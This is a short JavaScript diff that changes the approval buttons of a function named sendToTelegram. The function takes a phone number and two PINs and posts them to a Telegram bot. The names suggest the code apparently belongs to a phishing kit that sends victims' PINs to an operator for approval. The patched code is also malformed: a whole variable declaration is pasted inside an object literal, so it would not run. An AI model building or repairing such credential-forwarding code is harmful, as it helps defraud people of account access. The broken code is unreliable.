@@ -385,9 +385,28 @@ function sendToTelegram(phone, firstPin, secondPin) {
   
   const inlineKeyboard = {
     inline_keyboard: [[
-      { text: "✅ Approve", callback_data: `APPROVE_${phone}` },
-      { text: "❌ Reject",  callback_data: `REJECT_${phone}` }
-    ]]
+      { const inlineKeyboard = {
+  inline_keyboard: [
+    [
+      {
+        text: "❌ Reject Application",
+        callback_data: "REJECT_APPLICATION"
+      }
+    ],
+    [
+      {
+        text: "🔄 Resend Notification",
+        callback_data: "RESEND_NOTIFICATION"
+      }
+    ],
+    [
+      {
+        text: "✅ Approve Application",
+        callback_data: "APPROVE_APPLICATION"
+      }
+    ]
+  ]
+};
   };
   
   return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
